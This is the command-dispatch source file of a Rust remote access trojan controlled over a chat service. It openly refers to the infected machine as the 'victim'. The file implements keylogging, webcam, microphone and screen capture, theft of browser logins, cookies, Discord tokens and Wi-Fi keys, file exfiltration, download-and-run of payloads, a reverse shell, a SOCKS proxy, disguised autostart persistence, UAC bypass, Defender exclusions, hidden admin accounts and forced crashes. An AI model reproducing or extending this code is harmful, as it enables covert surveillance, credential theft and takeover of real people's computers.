// language: Rust, file: src/commands.rs
// Command surface. Text results go to the victim's `console` channel, files to `files`,
// system/geo to `information`.
#![allow(dead_code)]
use anyhow::Result;
use serde_json::Value;

use crate::config::Config;
use crate::stoat::Stoat;
use crate::workspace::Workspace;
use crate::{capture, host, info, input};

const HELP: &str = "\
!help                      this
!info                      refresh the information channel
!sysinfo                   host / os / cpu / mem
!shell <cmd>               run cmd.exe /C, return output
!exec <exe> [args]         launch detached
!ps                        process list
!kill <pid>                terminate pid
!screenshot                all monitors -> files channel
!mic <secs>                record default mic -> files channel
!freeze [secs]             block input; secs = auto-release (e.g. !freeze 30)
!keylog start|stop|dump|clear
!clipboard [text]          get or set clipboard
!ls [path]                 directory listing
!getfile <path>            exfil a local file
!putfile [dest]            save the attachment on this message
!download <url> [dest]     pull a remote file
!persist / !unpersist      HKCU Run autostart
!msg <text>                message box
!monitor on|off            display power
!wifi                      saved Wi-Fi profiles + plaintext keys
!wallpaper <url|path>      set the desktop wallpaper
!speak <text>              speak text aloud (Windows TTS)
!reboot now                reboot the machine
!shutdown now|abort        power off / cancel shutdown
!bsod now                  force a bugcheck (hard crash)
!volume [0-100|mute|unmute] system volume
!webcam                    camera still -> files channel
!browsers                  saved logins + cookies (chrome/edge/firefox)
!discord                   grab + validate Discord tokens from disk
!powershell <cmd>          run PowerShell, return output
!zip <file|folder>         zip a path and exfil -> files
!dropexec <url>            download and run a file
!toast <text>              Windows toast notification
!clear [info|files]        delete messages in #console (or #information / #files)
!uac [silent|disable]      request admin (default: UAC prompt; silent = no-prompt bypass)
!net                       live connections + owning process
!portscan <ip> <ports>     TCP connect scan from the victim
!revshell <host> [port]    interactive cmd shell back to you
!proxy [port]              SOCKS5 proxy through the victim (default 1080)
!audio [secs]              record system audio (speaker loopback)
!open <url>                open a URL in the default browser
!defender [add|remove <p>] Defender status / exclusions
!hosts [add <ip> <dom>|remove <dom>|clear]  edit the hosts file (+DNS flush)
!print <file>              print a file on the default printer
!location                  precise location (Windows Location API)
!systask <cmd>             run a command as SYSTEM, return output (admin)
!newuser <name> <pass>     create a local admin account (admin)
!screenshare               join voice + share the screen live
!voice                     join voice + stream the microphone live
!vc stop                   stop a live voice stream
!priv                      pre-grant mic/camera consent (stops the Windows prompt)
!lock                      lock workstation
!update                    pull newest build from #update and restart
!uninstall                 remove payload + launcher + Run key, then stop
!exit                      terminate agent";

fn stamp() -> String {
    chrono::Local::now().format("%Y%m%d-%H%M%S").to_string()
}

/// Every command name we recognise (used for "did you mean").
const COMMANDS: &[&str] = &[
    "help", "ping", "id", "whoami", "info", "sysinfo", "shell", "cmd", "sh", "exec", "start",
    "ps", "kill", "screenshot", "ss", "mic", "freeze", "unfreeze", "keylog", "clipboard", "clip",
    "ls", "dir", "getfile", "grab", "putfile", "receive", "download", "persist", "unpersist",
    "msg", "popup", "monitor", "wifi", "wallpaper", "speak", "reboot", "shutdown", "bsod",
    "volume", "webcam", "cam", "browsers", "creds", "powershell", "pwsh", "discord", "tokens",
    "zip", "dropexec", "toast", "clear", "uac", "elevate", "net", "connections", "portscan",
    "revshell", "proxy", "audio", "open", "defender", "host", "hosts", "lock", "update",
    "uninstall", "cleanup", "remove", "exit", "quit",
];

fn levenshtein(a: &str, b: &str) -> usize {
    let a: Vec<char> = a.chars().collect();
    let b: Vec<char> = b.chars().collect();
    let mut prev: Vec<usize> = (0..=b.len()).collect();
    let mut cur = vec![0usize; b.len() + 1];
    for i in 1..=a.len() {
        cur[0] = i;
        for j in 1..=b.len() {
            let cost = if a[i - 1] == b[j - 1] { 0 } else { 1 };
            cur[j] = (prev[j] + 1).min(cur[j - 1] + 1).min(prev[j - 1] + cost);
        }
        std::mem::swap(&mut prev, &mut cur);
    }
    prev[b.len()]
}

/// Nearest known command within edit distance 2, or a prefix relationship.
fn suggest(cmd: &str) -> Option<&'static str> {
    let mut best: Option<(&'static str, usize)> = None;
    for c in COMMANDS {
        let d = levenshtein(cmd, c);
        if best.map(|(_, bd)| d < bd).unwrap_or(true) {
            best = Some((c, d));
        }
    }
    best.and_then(|(c, d)| {
        if d <= 2 || c.starts_with(cmd) || cmd.starts_with(c) {
            Some(c)
        } else {
            None
        }
    })
}

pub async fn dispatch(
    st: &Stoat,
    cfg: &Config,
    ws: &Workspace,
    content: &str,
    attachments: &[Value],
) -> Result<()> {
    let console = ws.channels.console.as_str();
    let files = ws.channels.files.as_str();
    let infoch = ws.channels.info.as_str();

    let raw = content.trim_start_matches(&cfg.prefix).trim();
    let mut it = raw.splitn(2, char::is_whitespace);
    let cmd = it.next().unwrap_or("").to_ascii_lowercase();
    let arg = it.next().unwrap_or("").trim().to_string();

    match cmd.as_str() {
        "help" => st.send_code(console, HELP).await?,
        "ping" => st.send(console, "pong").await?,
        "id" | "whoami" => st.send(console, &format!("bot {}", st.bot_id)).await?,
        "info" => {
            let _ = st.purge_channel(infoch).await;
            let text = info::dump(cfg, ws).await;
            st.send_code(infoch, &text).await?;
        }
        "sysinfo" => st.send_code(console, &host::sysinfo_text()).await?,
        "shell" | "cmd" | "sh" => {
            let out = tokio::task::spawn_blocking(move || host::run_shell(&arg)).await?;
            st.send_code(console, &out).await?;
        }
        "exec" | "start" => {
            host::exec(&arg)?;
            st.send(console, "launched").await?;
        }
        "ps" => st.send_code(console, &host::process_list()).await?,
        "kill" => {
            let pid: u32 = arg.parse().unwrap_or(0);
            st.send(console, &host::kill_pid(pid)).await?;
        }
        "screenshot" | "ss" => {
            let bytes = tokio::task::spawn_blocking(capture::screenshot_jpeg).await??;
            st.send_file(files, &format!("screen-{}.jpg", stamp()), bytes, "screenshot")
                .await?;
        }
        "mic" => {
            let secs: u64 = arg.parse().unwrap_or(5);
            let bytes = tokio::task::spawn_blocking(move || capture::record_wav(secs)).await??;
            st.send_file(files, &format!("mic-{}.wav", stamp()), bytes, "microphone")
                .await?;
        }
        "freeze" => {
            let secs: u64 = arg.trim().parse().unwrap_or(0);
            input::freeze();
            if secs > 0 {
                let st2 = st.clone();
                let ch = console.to_string();
                tokio::spawn(async move {
                    tokio::time::sleep(std::time::Duration::from_secs(secs)).await;
                    input::unfreeze();
                    let _ = st2.send(&ch, &format!("input released after {secs}s")).await;
                });
                st.send(console, &format!("input frozen for {secs}s")).await?;
            } else {
                st.send(console, "input frozen (use !unfreeze)").await?;
            }
        }
        "unfreeze" => {
            input::unfreeze();
            st.send(console, "input released").await?;
        }
        "keylog" => match arg.split_whitespace().next().unwrap_or("dump") {
            "start" => {
                input::keylog_start();
                st.send(console, "keylog started").await?;
            }
            "stop" => {
                input::keylog_stop();
                st.send(console, "keylog stopped").await?;
            }
            "clear" => {
                input::keylog_clear();
                st.send(console, "keylog cleared").await?;
            }
            _ => {
                let d = input::keylog_dump();
                st.send_code(console, if d.is_empty() { "(empty)" } else { &d })
                    .await?;
            }
        },
        "clipboard" | "clip" => {
            if arg.is_empty() {
                let t = host::clip_get().unwrap_or_default();
                st.send_code(console, &t).await?;
            } else {
                host::clip_set(&arg)?;
                st.send(console, "clipboard set").await?;
            }
        }
        "ls" | "dir" => st.send_code(console, &host::list_dir(&arg)).await?,
        "getfile" | "grab" => {
            let path = arg.clone();
            let bytes = tokio::task::spawn_blocking(move || std::fs::read(&path)).await??;
            let name = std::path::Path::new(&arg)
                .file_name()
                .map(|s| s.to_string_lossy().to_string())
                .unwrap_or_else(|| "file.bin".into());
            st.send_file(files, &name, bytes, "file").await?;
        }
        "putfile" | "receive" => {
            if attachments.is_empty() {
                st.send(console, "no attachment on that message").await?;
            } else {
                let a = &attachments[0];
                let tag = a["tag"].as_str().unwrap_or("attachments");
                let id = a["_id"].as_str().unwrap_or("");
                let fname = a["filename"].as_str().unwrap_or("recv.bin");
                let dest = if arg.is_empty() { fname.to_string() } else { arg.clone() };
                let bytes = st.download(tag, id).await?;
                std::fs::write(&dest, &bytes)?;
                st.send(console, &format!("saved {dest} ({} bytes)", bytes.len()))
                    .await?;
            }
        }
        "download" => {
            let mut parts = arg.splitn(2, char::is_whitespace);
            let url = parts.next().unwrap_or("");
            let dest = parts.next().unwrap_or("download.bin").to_string();
            if url.is_empty() {
                st.send(console, "usage: !download <url> [dest]").await?;
            } else {
                let bytes = st.raw_get(url).await?;
                std::fs::write(&dest, &bytes)?;
                st.send(console, &format!("saved {dest} ({} bytes)", bytes.len()))
                    .await?;
            }
        }
        "persist" => {
            let name = std::env::var("RAT_NAME")
                .unwrap_or_else(|_| "WindowsSecurityHealth".into());
            let p = host::ensure_autostart(&name)?;
            st.send(console, &format!("persisted -> {p}")).await?;
        }
        "unpersist" => {
            let name = std::env::var("RAT_NAME")
                .unwrap_or_else(|_| "WindowsSecurityHealth".into());
            host::unpersist(&name)?;
            st.send(console, "autostart removed").await?;
        }
        "msg" | "popup" => {
            let text = if arg.is_empty() { "hello".to_string() } else { arg.clone() };
            tokio::task::spawn_blocking(move || host::message_box("System", &text)).await?;
            st.send(console, "shown").await?;
        }
        "monitor" => {
            if arg.eq_ignore_ascii_case("on") {
                host::monitor_on();
            } else {
                host::monitor_off();
            }
            st.send(console, "ok").await?;
        }
        "wifi" => {
            let r = tokio::task::spawn_blocking(host::wifi_dump).await?;
            st.send_code(console, &r).await?;
        }
        "wallpaper" => {
            if arg.is_empty() {
                st.send(console, "usage: !wallpaper <url|path>").await?;
            } else {
                let path = if arg.starts_with("http") {
                    let bytes = st.raw_get(&arg).await?;
                    let p = std::env::temp_dir().join(format!("wp-{}.img", stamp()));
                    std::fs::write(&p, &bytes)?;
                    p.to_string_lossy().to_string()
                } else {
                    arg.clone()
                };
                host::set_wallpaper(&path)?;
                st.send(console, "wallpaper set").await?;
            }
        }
        "speak" => {
            if arg.is_empty() {
                st.send(console, "usage: !speak <text>").await?;
            } else {
                host::speak(&arg);
                st.send(console, "speaking").await?;
            }
        }
        "reboot" => {
            if arg.eq_ignore_ascii_case("now") {
                host::reboot();
                st.send(console, "rebooting now").await?;
            } else {
                st.send(console, "usage: !reboot now").await?;
            }
        }
        "shutdown" => {
            if arg.eq_ignore_ascii_case("abort") {
                let r = host::abort_shutdown();
                st.send(console, &r).await?;
            } else if arg.eq_ignore_ascii_case("now") {
                host::shutdown();
                st.send(console, "shutting down now").await?;
            } else {
                st.send(console, "usage: !shutdown now | !shutdown abort").await?;
            }
        }
        "bsod" => {
            if arg.eq_ignore_ascii_case("now") {
                st.send(console, "bugchecking now").await.ok();
                host::bsod()?;
            } else {
                st.send(console, "usage: !bsod now").await?;
            }
        }
        "volume" => {
            let a = arg.trim().to_ascii_lowercase();
            if a.is_empty() {
                let pct = crate::volume::get_percent().unwrap_or(0);
                let muted = crate::volume::get_mute().unwrap_or(false);
                st.send(
                    console,
                    &format!("volume: {pct}%{}", if muted { " (muted)" } else { "" }),
                )
                .await?;
            } else if a == "mute" {
                crate::volume::set_mute(true)?;
                st.send(console, "muted").await?;
            } else if a == "unmute" {
                crate::volume::set_mute(false)?;
                st.send(console, "unmuted").await?;
            } else if let Ok(p) = a.parse::<u32>() {
                crate::volume::set_percent(p)?;
                st.send(console, &format!("volume set to {}", p.min(100))).await?;
            } else {
                st.send(console, "usage: !volume [0-100|mute|unmute]").await?;
            }
        }
        "webcam" | "cam" => {
            let bytes = tokio::task::spawn_blocking(capture::webcam_jpeg).await??;
            st.send_file(files, &format!("cam-{}.jpg", stamp()), bytes, "webcam")
                .await?;
        }
        "browsers" | "creds" => {
            let r = tokio::task::spawn_blocking(crate::browsers::harvest).await?;
            st.send_code(console, &r).await?;
        }
        "powershell" | "pwsh" => {
            if arg.is_empty() {
                st.send(console, "usage: !powershell <cmd>").await?;
            } else {
                let out =
                    tokio::task::spawn_blocking(move || host::run_powershell(&arg)).await?;
                st.send_code(console, &out).await?;
            }
        }
        "discord" | "tokens" => {
            let toks = tokio::task::spawn_blocking(crate::discord::grab).await?;
            if toks.is_empty() {
                st.send(console, "no discord tokens found").await?;
            } else {
                let client = reqwest::Client::builder()
                    .timeout(std::time::Duration::from_secs(15))
                    .build()?;
                for t in toks {
                    match crate::discord::validate(&client, &t).await {
                        Some(who) => {
                            st.send_code(console, &format!("VALID  {who}\n{t}")).await?;
                        }
                        None => {
                            st.send_code(console, &format!("dead/expired\n{t}")).await?;
                        }
                    }
                }
            }
        }
        "zip" => {
            if arg.is_empty() {
                st.send(console, "usage: !zip <file|folder>").await?;
            } else {
                let p = std::path::PathBuf::from(&arg);
                let bytes =
                    tokio::task::spawn_blocking(move || crate::archive::zip_path(&p)).await??;
                let mb = bytes.len() as f64 / 1_048_576.0;
                if bytes.len() > 19 * 1024 * 1024 {
                    st.send(
                        console,
                        &format!("zip is {mb:.1} MB — over the 20 MB attachment limit"),
                    )
                    .await?;
                } else {
                    let name = format!(
                        "{}.zip",
                        std::path::Path::new(&arg)
                            .file_name()
                            .map(|s| s.to_string_lossy().to_string())
                            .unwrap_or_else(|| "archive".into())
                    );
                    st.send_file(files, &name, bytes, &format!("archive {mb:.1} MB"))
                        .await?;
                }
            }
        }
        "dropexec" => {
            if arg.is_empty() {
                st.send(console, "usage: !dropexec <url>").await?;
            } else {
                let bytes = st.raw_get(&arg).await?;
                let name = std::path::Path::new(&arg)
                    .file_name()
                    .map(|s| s.to_string_lossy().to_string())
                    .unwrap_or_else(|| "payload.exe".into());
                let p = std::env::temp_dir().join(&name);
                std::fs::write(&p, &bytes)?;
                host::exec(&p.to_string_lossy())?;
                st.send(
                    console,
                    &format!("downloaded + launched {} ({} bytes)", p.display(), bytes.len()),
                )
                .await?;
            }
        }
        "toast" => {
            let msg = if arg.is_empty() { "hello".to_string() } else { arg.clone() };
            host::toast("System", &msg);
            st.send(console, "toast shown").await?;
        }
        "clear" => {
            let which = arg.trim().to_ascii_lowercase();
            let (target, label) = match which.as_str() {
                "info" | "information" => (infoch.to_string(), "information"),
                "files" => (files.to_string(), "files"),
                _ => (console.to_string(), "console"),
            };
            if target.is_empty() {
                st.send(console, "no workspace yet").await?;
            } else {
                match st.delete_channel(&target).await {
                    Ok(()) => {
                        // Recreate it (and refresh our workspace) via the normal ensure path.
                        let mut new_console = console.to_string();
                        if let Some(control) = &cfg.channel {
                            if let Ok(nw) = crate::workspace::ensure(st, control).await {
                                new_console = nw.channels.console.clone();
                                *crate::AGENT_WS.lock().unwrap() = Some(nw);
                            }
                        }
                        st.send(
                            &new_console,
                            &format!("cleared #{label} (deleted + recreated)"),
                        )
                        .await?;
                    }
                    Err(e) => {
                        let n = st.purge_channel(&target).await.unwrap_or(0);
                        st.send(
                            console,
                            &format!("delete failed ({e:#}); purged {n} message(s) instead"),
                        )
                        .await?;
                    }
                }
            }
        }
        "net" | "connections" => {
            let r = tokio::task::spawn_blocking(host::net_connections).await?;
            st.send_code(console, &r).await?;
        }
        "portscan" => {
            let mut it = arg.split_whitespace();
            let target = it.next().unwrap_or("").to_string();
            let ports = it.next().unwrap_or("1-1024").to_string();
            if target.is_empty() {
                st.send(console, "usage: !portscan <ip> <ports>").await?;
            } else {
                st.send(console, &format!("scanning {target} {ports} ...")).await?;
                let (open, scanned) = crate::net::portscan(&target, &ports).await?;
                let list = open
                    .iter()
                    .map(|p| p.to_string())
                    .collect::<Vec<_>>()
                    .join(", ");
                let list = if list.is_empty() { "none".to_string() } else { list };
                st.send_code(
                    console,
                    &format!("{}/{} open: {list}", open.len(), scanned.len()),
                )
                .await?;
            }
        }
        "revshell" => {
            let parts: Vec<&str> = arg.split_whitespace().collect();
            let host = parts.first().map(|s| s.to_string()).unwrap_or_default();
            let port: u16 = parts.get(1).and_then(|p| p.parse().ok()).unwrap_or(4444);
            if host.is_empty() {
                st.send(console, "usage: !revshell <host> [port]").await?;
            } else {
                st.send(console, &format!("connecting back to {host}:{port}"))
                    .await?;
                tokio::spawn(async move {
                    let _ = crate::net::reverse_shell(&host, port).await;
                });
            }
        }
        "proxy" => {
            let port: u16 = arg.trim().parse().unwrap_or(1080);
            tokio::spawn(async move {
                let _ = crate::net::socks5_proxy(port).await;
            });
            st.send(console, &format!("socks5 proxy listening on 0.0.0.0:{port}"))
                .await?;
        }
        "audio" => {
            let secs: u64 = arg.trim().parse().unwrap_or(10);
            let bytes =
                tokio::task::spawn_blocking(move || capture::record_loopback_wav(secs)).await??;
            st.send_file(files, &format!("audio-{}.wav", stamp()), bytes, "system audio")
                .await?;
        }
        "open" => {
            if arg.is_empty() {
                st.send(console, "usage: !open <url>").await?;
            } else {
                host::open_url(&arg);
                st.send(console, "opened").await?;
            }
        }
        "host" | "hosts" => {
            let a = arg.trim();
            if a.is_empty() {
                let r = tokio::task::spawn_blocking(host::hosts_show).await?;
                st.send_code(console, &r).await?;
            } else if let Some(rest) = a.strip_prefix("add ") {
                let mut it = rest.split_whitespace();
                let ip = it.next().unwrap_or("");
                let dom = it.next().unwrap_or("");
                if ip.is_empty() || dom.is_empty() {
                    st.send(console, "usage: !hosts add <ip> <domain>").await?;
                } else {
                    let r = host::hosts_add(ip, dom)?;
                    st.send(console, &r).await?;
                }
            } else if let Some(rest) = a.strip_prefix("remove ") {
                let r = host::hosts_remove(rest.trim())?;
                st.send(console, &r).await?;
            } else if a.eq_ignore_ascii_case("clear") {
                let r = host::hosts_clear()?;
                st.send(console, &r).await?;
            } else {
                st.send(
                    console,
                    "usage: !hosts [add <ip> <domain> | remove <domain> | clear]",
                )
                .await?;
            }
        }
        "defender" => {
            let a = arg.trim();
            if let Some(p) = a.strip_prefix("add ") {
                let r = host::defender_exclude(p.trim(), true);
                st.send_code(console, &r).await?;
            } else if let Some(p) = a.strip_prefix("remove ") {
                let r = host::defender_exclude(p.trim(), false);
                st.send_code(console, &r).await?;
            } else {
                let r = tokio::task::spawn_blocking(host::defender_status).await?;
                st.send_code(console, &r).await?;
            }
        }
        "print" => {
            if arg.is_empty() {
                st.send(console, "usage: !print <file>").await?;
            } else {
                let r = tokio::task::spawn_blocking(move || host::print_file(&arg)).await?;
                st.send(console, if r.trim().is_empty() { "sent to printer" } else { &r })
                    .await?;
            }
        }
        "location" | "locate" => {
            let r = tokio::task::spawn_blocking(host::location).await??;
            st.send(console, &r).await?;
        }
        "systask" => {
            if arg.is_empty() {
                st.send(console, "usage: !systask <cmd>").await?;
            } else {
                let r = tokio::task::spawn_blocking(move || host::systask(&arg)).await??;
                st.send_code(console, &r).await?;
            }
        }
        "newuser" => {
            let mut it = arg.split_whitespace();
            let name = it.next().unwrap_or("");
            let pass = it.next().unwrap_or("");
            if name.is_empty() || pass.is_empty() {
                st.send(console, "usage: !newuser <name> <password>").await?;
            } else {
                let (n, p) = (name.to_string(), pass.to_string());
                let r = tokio::task::spawn_blocking(move || host::new_user(&n, &p)).await?;
                st.send_code(console, &r).await?;
            }
        }
        "screenshare" | "share" => {
            st.send(console, "joining voice + sharing screen ...").await?;
            let st2 = st.clone();
            let cfg2 = cfg.clone();
            let ws2 = ws.clone();
            tokio::spawn(async move {
                match crate::voice::screenshare(&st2, &cfg2, &ws2).await {
                    Ok(ch) => {
                        let _ = st2
                            .send(
                                &ws2.channels.console,
                                &format!("screenshare live — join the voice channel ({ch}) to watch"),
                            )
                            .await;
                    }
                    Err(e) => {
                        let _ = st2
                            .send(&ws2.channels.console, &format!("screenshare failed: {e:#}"))
                            .await;
                    }
                }
            });
        }
        "voice" | "micstream" => {
            st.send(console, "joining voice + streaming mic ...").await?;
            let st2 = st.clone();
            let cfg2 = cfg.clone();
            let ws2 = ws.clone();
            tokio::spawn(async move {
                match crate::voice::voice_mic(&st2, &cfg2, &ws2).await {
                    Ok(ch) => {
                        let _ = st2
                            .send(
                                &ws2.channels.console,
                                &format!("mic live — join the voice channel ({ch}) to listen"),
                            )
                            .await;
                    }
                    Err(e) => {
                        let _ = st2
                            .send(&ws2.channels.console, &format!("voice failed: {e:#}"))
                            .await;
                    }
                }
            });
        }
        "vc" => {
            if arg.trim().eq_ignore_ascii_case("stop") {
                crate::voice::STOP.store(true, std::sync::atomic::Ordering::SeqCst);
                st.send(console, "stopping voice stream").await?;
            } else {
                st.send(console, "usage: !vc stop").await?;
            }
        }
        "priv" | "consent" | "allowmic" => {
            let r = tokio::task::spawn_blocking(host::privacy_allow).await??;
            st.send_code(console, &r).await?;
        }
        "uac" | "elevate" => {
            let a = arg.trim().to_ascii_lowercase();
            // Default to the UAC *prompt*: Defender signatures the silent bypass
            // (Behavior:Win32/UACBypassExp), the prompt is a normal elevation.
            let prompt = !a.contains("silent");
            let disable = a.contains("disable") || a.contains("off");
            if host::is_elevated() {
                if disable {
                    host::disable_uac()?;
                    st.send(console, "already admin — UAC disabled").await?;
                } else {
                    st.send(console, "already admin").await?;
                }
            } else {
                st.send(
                    console,
                    if prompt {
                        "requesting elevation (UAC prompt) ..."
                    } else {
                        "requesting elevation (silent) ..."
                    },
                )
                .await?;
                match host::uac_elevate(prompt, disable) {
                    Ok(m) => {
                        let _ = st.send(console, &m).await;
                    }
                    Err(e) => {
                        st.send(console, &format!("elevation failed: {e:#}")).await?;
                    }
                }
            }
        }
        "lock" => {
            host::lock_workstation();
            st.send(console, "locked").await?;
        }
        "update" => {
            st.send(console, "checking #update ...").await?;
            match crate::update::stage(st, cfg, ws).await {
                Ok(Some(label)) => {
                    st.send(console, &format!("staged {label}; restarting")).await?;
                    match crate::update::relaunch_and_exit() {
                        Ok(()) => std::process::exit(0),
                        Err(e) => {
                            st.send(console, &format!("restart failed: {e:#}")).await?;
                        }
                    }
                }
                Ok(None) => st.send(console, "already on the newest build").await?,
                Err(e) => st.send(console, &format!("update failed: {e:#}")).await?,
            }
        }
        "uninstall" | "cleanup" | "remove" => {
            let (run_status, removed, dll) = host::purge_install();
            let list = if removed.is_empty() {
                "(none)".to_string()
            } else {
                removed
                    .iter()
                    .map(|p| p.display().to_string())
                    .collect::<Vec<_>>()
                    .join(", ")
            };
            st.send(
                console,
                &format!(
                    "uninstall: run key {run_status}; removed {list}; deleting {} on exit",
                    dll.display()
                ),
            )
            .await?;
            host::schedule_self_cleanup(&dll);
            std::process::exit(0);
        }
        "exit" | "quit" => {
            st.send(console, "bye").await.ok();
            std::process::exit(0);
        }
        _ => {
            let hint = suggest(&cmd)
                .map(|s| format!(" — did you mean !{s}?"))
                .unwrap_or_default();
            st.send(console, &format!("unknown command: {cmd}{hint}")).await?;
        }
    }
    Ok(())
}
